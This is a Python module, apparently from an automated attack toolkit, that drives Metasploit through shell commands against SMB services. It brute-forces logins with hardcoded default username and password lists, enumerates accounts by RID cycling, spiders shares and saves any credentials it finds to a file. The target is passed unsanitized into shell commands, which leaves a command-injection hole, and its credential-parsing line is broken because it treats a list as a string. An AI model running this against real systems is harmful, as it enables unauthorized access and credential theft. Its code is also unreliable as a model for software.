import subprocess
import re
from mods.mod_utils import *
import os

smb_users = ["admin","user","manager","supervisor","administrator","test","it","backup","lab","demo","smb"]
smb_passwords = ["password","admin","administrator","backup","test","lab","demo"]
domain = '.'
credentials = []


def export_wordlists():
    with open('smb_users.txt', 'w') as file:
        file.write('\n'.join(smb_users))
        file.close()
    
    with open('smb_pass.txt', 'w') as file:
        file.write('\n'.join(smb_passwords))
        file.close()


def export_credentials():
    with open('smb_credentials.txt', 'w') as file:
        file.write('\n'.join(credentials))
        file.close()


def rid_cycling(target, user="Guest", passw="", domain="."):
    cmd = f'msfconsole -q -x "use scanner/smb/smb_lookupsid;set RHOSTS {target};set SMBUser {user};set SMBPass {passw};set MinRID 1000;set MaxRID 5000;set THREADS 10;set SMBDomain {domain};run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return
    if output:
        if ('USER' in output):
            rid_cycling_parse(output, cmd)


def rid_cycling_parse(output, cmd):
    global domain
    global smb_users

    print_banner('445')
    print('[!]', cmd)
    printc('[+] RID Cycling Attack to get Usernames', GREEN)
    print('')

    temp_users = []

    for line in output.splitlines():
        if ('DOMAIN' in line) and ('LOCAL' in line):
            domain = re.findall('LOCAL.*DOMAIN\((.*) -', line)[0]
            printc(f'[+] Domain: {domain}', BLUE)
        if ('USER' in line):
            user = re.findall('USER=(.*)\sRID', line)[0]
            printc(f'[+] {user}', BLUE)
            temp_users.append(user)
    if len(temp_users) > 0:
        smb_users = temp_users


def bruteforce(target, port):
    global credentials
    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set USER_AS_PASS true;set BLANK_PASSWORDS true;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return

    if output:
        if ('[+]' in output):
            print_banner('445')
            print('[!]', cmd)
            printc('[+] Creds Found!!!', GREEN)
            print('')
            for line in output.splitlines():
                creds = re.findall('\[\+\].*Success.*\\\(.*)\'', line)
                if (creds.split(':')[1] == ''): continue
                print(creds)
                credentials.append(creds)
    export_credentials()


def enumerate_shares(target, user, passw, domain):
    cmd = f'msfconsole -q -x "use scanner/smb/smb_enumshares;set rhosts {target};set LogSpider 0;set MaxDepth 0;set SMBPass {passw};set SMBUser {user};set ShowFiles true;set SpiderShares true;run;exit;"'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return

    if output:
        print_banner('445')
        print('[!]', cmd)
        print('[!] Enumerating Shares.')
        print('')
        print(output)

    rid_cycling(target, user, passw, domain)


def handle_smb(target, port):
    len_default_users = len(smb_users)

    # RID CYCLING NO PASS
    #rid_cycling(target, user='')

    #if len_default_users == len(smb_users):
        #rid_cycling(target)

    #export_wordlists()
    # BRUTEFORCE LOGIN
    bruteforce(target, port)



    try:
        #os.remove('smb_pass.txt')
        pass
    except Exception as e:
        printc(f'[-] {e}', RED)